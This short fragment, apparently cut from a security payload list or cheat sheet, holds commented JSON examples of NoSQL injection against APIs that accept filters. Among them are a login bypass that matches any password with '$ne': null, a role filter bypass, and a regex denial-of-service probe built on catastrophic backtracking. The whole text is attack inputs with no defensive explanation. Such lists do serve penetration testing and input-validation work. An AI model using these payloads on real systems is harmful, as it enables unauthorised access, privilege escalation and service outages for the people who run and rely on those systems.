...
# Example JSON payloads for APIs accepting filters
# {"email": "user@site.com", "password": {"$ne": null}}
# {"role": {"$ne": "user"}}

# Regex DoS probe (catastrophic backtracking)
# {"name": {"$regex": "^(a+)+$"}, "_id": "known_id"}
